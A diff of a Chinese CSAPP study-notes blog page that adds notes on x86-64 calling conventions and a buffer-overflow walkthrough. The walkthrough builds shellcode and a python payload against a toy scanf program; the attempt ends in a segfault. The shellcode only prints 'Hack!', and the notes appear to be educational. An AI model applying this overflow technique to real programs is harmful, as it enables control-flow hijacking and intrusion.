@@ -206,7 +206,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      682 字
+      2.2k 字
     </span>
   
 
@@ -216,7 +216,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       大概 
-      8
+      31
        分钟
     </span>
   
@@ -258,7 +258,7 @@
             
               <p class="note note-info">
                 
-                  Last Update @ 2021年8月31日 周二 15:41:17
+                  Last Update @ 2021年9月4日 周六 13:58:4
                 
               </p>
             
@@ -267,6 +267,40 @@
 <p>CSAPP 采用的是 x64 ATT 汇编, 然而平时用的 IDA 什么的都是 MASM 汇编… 有点头大<br>
 话说回来, 都会肯定不是坏事… 大概</p>
 </blockquote>
+<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList=false} -->
+<!-- code_chunk_output -->
+<ul>
+<li><a href="#%E7%BC%96%E8%AF%91-%E6%B1%87%E7%BC%96%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96">编译 汇编与反汇编</a>
+<ul>
+<li><a href="#%E7%BC%96%E8%AF%91">编译</a></li>
+<li><a href="#%E5%8F%8D%E6%B1%87%E7%BC%96">反汇编</a></li>
+</ul>
+</li>
+<li><a href="#%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E5%88%9D%E6%AD%A5">汇编语言 初步</a>
+<ul>
+<li><a href="#%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F">数据格式</a></li>
+<li><a href="#%E5%85%B3%E4%BA%8E-lea-%E6%8C%87%E4%BB%A4">关于 LEA 指令</a></li>
+<li><a href="#%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD">条件判断</a>
+<ul>
+<li><a href="#cmp-%E6%8C%87%E4%BB%A4">CMP 指令</a></li>
+<li><a href="#test-%E6%8C%87%E4%BB%A4">TEST 指令</a></li>
+</ul>
+</li>
+<li><a href="#switch-%E7%9A%84%E5%AE%9E%E7%8E%B0">switch 的实现</a></li>
+</ul>
+</li>
+<li><a href="#%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E9%97%B4%E7%9A%84%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92">调用过程间的数据传递</a>
+<ul>
+<li><a href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB">缓冲区溢出攻击</a>
+<ul>
+<li><a href="#%E4%B8%80%E4%B8%AA%E5%A4%B1%E8%B4%A5%E7%9A%84%E4%BE%8B%E5%AD%90">一个失败的例子</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AF%B9%E6%8A%97%E6%8E%AA%E6%96%BD">对抗措施</a></li>
+</ul>
+</li>
+</ul>
+<!-- /code_chunk_output -->
 <h1 id="编译-汇编与反汇编"><a class="markdownIt-Anchor" href="#编译-汇编与反汇编"></a> 编译 汇编与反汇编</h1>
 <h2 id="编译"><a class="markdownIt-Anchor" href="#编译"></a> 编译</h2>
 <p><code>gcc -Og -o [output file] [source files]</code></p>
@@ -302,13 +336,17 @@
 <h2 id="反汇编"><a class="markdownIt-Anchor" href="#反汇编"></a> 反汇编</h2>
 <p>用 <code>objdump</code></p>
 <ul>
-<li><code>-d &lt;file(s)&gt;</code>: 将代码段反汇编；</li>
-<li><code>-S &lt;file(s)&gt;</code>: 将代码段反汇编的同时，将反汇编代码与源代码交替显示，编译时需要使用-g- 参数，即需要调试信息；</li>
+<li><code>-d &lt;file(s)&gt;</code>: 将代码段反汇编</li>
+<li><code>-S &lt;file(s)&gt;</code>: 将代码段反汇编的同时，将反汇编代码与源代码交替显示
+<ul>
+<li>编译时需要使用-g- 参数，生成调试信息</li>
+</ul>
+</li>
 <li><code>-C &lt;file(s)&gt;</code>: 将C++符号名逆向解析</li>
 <li><code>-l &lt;file(s)&gt;</code>: 反汇编代码中插入文件名和行号</li>
 <li><code>-j section &lt;file(s)&gt;</code>: 仅反汇编指定的section</li>
 </ul>
-<h1 id="汇编语言-初步"><a class="markdownIt-Anchor" href="#汇编语言-初步"></a> 汇编语言 - 初步</h1>
+<h1 id="汇编语言-初步"><a class="markdownIt-Anchor" href="#汇编语言-初步"></a> 汇编语言 初步</h1>
 <h2 id="数据格式"><a class="markdownIt-Anchor" href="#数据格式"></a> 数据格式</h2>
 <blockquote>
 <p>为什么一个字是两字节?</p>
@@ -366,7 +404,144 @@
 <p>所以 <code>test %rax, %rax</code> 这类两个操作数相同的指令可以用来<strong>判断其值的正负</strong></p>
 <h2 id="switch-的实现"><a class="markdownIt-Anchor" href="#switch-的实现"></a> switch 的实现</h2>
 <p>在分支较多且数值较为接近的时候<strong>可能</strong>会采用跳转表</p>
-<h1 id="过程控制"><a class="markdownIt-Anchor" href="#过程控制"></a> 过程控制</h1>
+<h1 id="调用过程间的数据传递"><a class="markdownIt-Anchor" href="#调用过程间的数据传递"></a> 调用过程间的数据传递</h1>
+<p>在 x86-64 中, 前六个参数可以通过寄存器传递, 从左到右顺序为 <code>rdi rsi rdx rcx r8~r15</code></p>
+<p><code>rbx rbp r12~r15</code> 为<strong>被调用者保存的寄存器</strong>, 也就是被调用者需要保证在被调用前后这些寄存器的值不变; 其他所有寄存器 (<code>rbp</code> 除外) 为调用者保存的寄存器, 也就是说, 被调用者可以修改这些寄存器的值, 因此调用者在调用其他函数前应先由自己保护好它们.</p>
+<p>如果参数多于六个 <s>(什么函数会这么写啊…)</s>, 剩下的参数按照从左到右的顺序依次压入栈中 (记得保证对齐), 然后再把调用者的返回地址入栈即可.</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">     Bottom
+     (HIGH)
++---------------+---------+
+|               |         v
+|  parameters   |     Frame of
+|     7~n       |      caller
++---------------+         ^
+|  return addr  |         |
++---------------+---------+
+|               |         |
+|    saved      |         |
+|  regesiters   |         |
+|  (rbp rbx..)  |         |
+|               |
++---------------+         |
+|               |         v
+|  local vars   |     Frame of
+|               |      callee
++---------------+         ^
+|               |         |
+| para for next |         |
+|   function    |         |
+|               |         |
++---------------+---------+
+      Top
+     (LOW)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>另外, 当参数为数组, 或函数中使用到了参数的地址, 这些参数也会保存在栈中, 例如下图</p>
+<p><img src="https://gitee.com/HorizonChaser/pic-bed/raw/master/img/20210903234411.png" srcset="/img/loading.gif" alt="demo"></p>
+<blockquote>
+<p>根据书上的说法, 当参数为结构体时也会将其保存到栈中, 但根据测试对于较为简单的结构体, 编译器仍然会将其保存到寄存器中, 参见 <a target="_blank" rel="noopener" href="https://godbolt.org/z/ax8666aGn">GodBolt的结果</a></p>
+</blockquote>
+<p>注意, <strong>这些保存到栈中的参数, 和 调用者的返回地址 都属于调用者的栈帧</strong></p>
+<h2 id="缓冲区溢出攻击"><a class="markdownIt-Anchor" href="#缓冲区溢出攻击"></a> 缓冲区溢出攻击</h2>
+<p>我们注意到, 返回地址在局部变量的 “上方” (指较高地址的位置), 所以如果我们通过对局部变量进行构造好的且足够长的赋值, 就有可能把返回地址覆盖掉. 这样, 当函数返回时就会跳转到我们指定的地址, 实现控制.</p>
+<p>容易想到, 一种简单的溢出是利用 <code>gets()</code> 函数没有指定最大长度的漏洞 - 它会一直从标准输入流中读取, 直到遇到回车. 同时, 如果我们能够输入汇编指令的话, 就可以让处理器跳转到我们自己的指令!</p>
+<p>我们精心构造的这种输入, 一般被称作 <code>shellcode</code>.</p>
+<h3 id="一个失败的例子"><a class="markdownIt-Anchor" href="#一个失败的例子"></a> 一个失败的例子</h3>
+<p>来看下面一段代码.</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What's your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s!\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在这里, <code>scanf</code> 会接受一个字符串的输入, 并保存到 <code>name</code> 中. 如果输入足够长, 那就可以将返回地址覆盖掉. 把它另存为 <code>victim.c</code>, 编译一下, 拿 <code>objdump</code> 反汇编看看.</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">0000000000401156 &lt;main&gt;:
+  401156:       f3 0f 1e fa             endbr64 
+  40115a:       55                      push   rbp
+  40115b:       48 89 e5                mov    rbp,rsp
+  40115e:       48 83 ec 40             sub    rsp,0x40
+  401162:       48 8d 45 c0             lea    rax,[rbp-0x40]
+  401166:       48 89 c6                mov    rsi,rax
+  401169:       48 8d 3d 94 0e 00 00    lea    rdi,[rip+0xe94]        # 402004 &lt;_IO_stdin_used+0x4&gt;
+  401170:       b8 00 00 00 00          mov    eax,0x0
+  401175:       e8 e6 fe ff ff          call   401060 &lt;__isoc99_scanf@plt&gt;
+  40117a:       48 8d 45 c0             lea    rax,[rbp-0x40]
+  40117e:       48 89 c6                mov    rsi,rax
+  401181:       48 8d 3d 7f 0e 00 00    lea    rdi,[rip+0xe7f]        # 402007 &lt;_IO_stdin_used+0x7&gt;
+  401188:       b8 00 00 00 00          mov    eax,0x0
+  40118d:       e8 be fe ff ff          call   401050 &lt;printf@plt&gt;
+  401192:       b8 00 00 00 00          mov    eax,0x0
+  401197:       c9                      leave  
+  401198:       c3                      ret    
+  401199:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看到, <code>sub rsp,0x40</code> 这条指令, 为 <code>name</code> 数组在栈上开辟了 64 字节大小的空间. 由此我们可以画出栈上的空间分配情况, 如下图</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">+--------------+
+|     ...      |
++--------------+
+|              |
+|  return addr |
+|              |
++--------------+ &lt;-- RSP should points here before ret
+|              |
+|   prev rbp   | &lt;-- 8 bytes long
+|              |
++--------------+ &lt;-- RBP should points here
+|     ...      |
++--------------+
+|              |
+|   name[64]   |
+|              |
++--------------+ &lt;-- RBP-0x40<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用 <code>gdb</code> 调试一下, 确认我们的猜想对不对. 首先, <code>gdb -q ./victim</code> 启动调试, 然后 <code>b *main</code>, 在 <code>main</code> 函数的第一条指令下断点, <code>r</code> 开始运行.</p>
+<p><img src="https://gitee.com/HorizonChaser/pic-bed/raw/master/img/20210904201815.png" srcset="/img/loading.gif" alt="gdb pic"></p>
+<p>可以看到, 这时 <code>RSP = 0x7fffffffde58</code>, 在下一条 <code>RBP</code> 入栈后会变为 <code>de50</code>. 用 <code>p &amp;name[0]</code> 查看 <code>name</code> 数组的地址, 发现是 <code>0x7fffffffde10</code>. 由此确认, 返回地址与 <code>name[0]</code> 之间的长度为 <code>0x48 == 72</code> 字节.</p>
+<p>接下来构造 <code>shellcode</code>, 我们的目标是输出一个字符串 <code>Hack!</code>, 写出如下的汇编代码:</p>
+<pre class="line-numbers language-ASM" data-language="ASM"><code class="language-ASM">[section .text]
+        global _start
+
+_start:
+        jmp END
+BEGIN:
+        mov rax, 1
+        mov rdi, 1
+        pop rsi         ; addr of string popped to RSI as arg of syscall
+        mov rdx, 5
+        syscall
+
+        mov rax, 0x3c
+        mov rdi, 0
+        syscall
+END:
+        call BEGIN      ; addr of string pushed into stack
+        DB "Hack!"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>编译 <code>nasm -f elf64 shell.asm</code>, 链接 <code>ld -s -o shell shell.o</code>, 然后 <code>objdump -d shell -M intel</code> 提取二进制的机器码:</p>
+<pre class="line-numbers language-ASM" data-language="ASM"><code class="language-ASM">Disassembly of section .text:
+
+0000000000401000 &lt;.text&gt;:
+  401000:       eb 1e                   jmp    0x401020
+  401002:       b8 01 00 00 00          mov    eax,0x1
+  401007:       bf 01 00 00 00          mov    edi,0x1
+  40100c:       5e                      pop    rsi
+  40100d:       ba 05 00 00 00          mov    edx,0x5
+  401012:       0f 05                   syscall 
+  401014:       b8 3c 00 00 00          mov    eax,0x3c
+  401019:       bf 00 00 00 00          mov    edi,0x0
+  40101e:       0f 05                   syscall 
+  401020:       e8 dd ff ff ff          call   0x401002
+  401025:       48 61                   rex.W (bad) 
+  401027:       63 6b 21                movsxd ebp,DWORD PTR [rbx+0x21]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这份 shellcode 的长度只有 42 字节, 因此我们还需要再填充 30 字节的数据, 之后才是用来覆盖返回地址的 <code>&amp;name[0]</code>. 因为其中有很多不可打印的字符, 所以我们用 python 把它输出到一个文件, 然后从文件作为输入.</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python -c 'print ("\xeb\x1e\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x05\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xdd\xff\xff\xff\x48\x61\x63\x6b\x21" + "\xdb"*30 + "\x10\xde\xff\xff\xff\x7f\x00\x00")' &gt; shellcode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<blockquote>
+<p>注意小端序</p>
+</blockquote>
+<p>这次尝试以失败告终, 已经确定成功覆盖了栈中之前保存的 <code>RBP</code>, 理论上返回地址也已经被覆盖, 但是就是无法跳转, 报告段错误… 看下图的 <code>EBP</code> 的值 (为了确定不是 x86-64 的问题, 使用 x86 重新编译了一次, shellcode 也重新写了一份)</p>
+<p><img src="https://gitee.com/HorizonChaser/pic-bed/raw/master/img/20210904214722.png" srcset="/img/loading.gif" alt="failed-try😭"></p>
+<blockquote>
+<p>大概是还有保护措施没有关掉…</p>
+</blockquote>
+<h2 id="对抗措施"><a class="markdownIt-Anchor" href="#对抗措施"></a> 对抗措施</h2>
 <p>//TODO</p>
 
             </div>
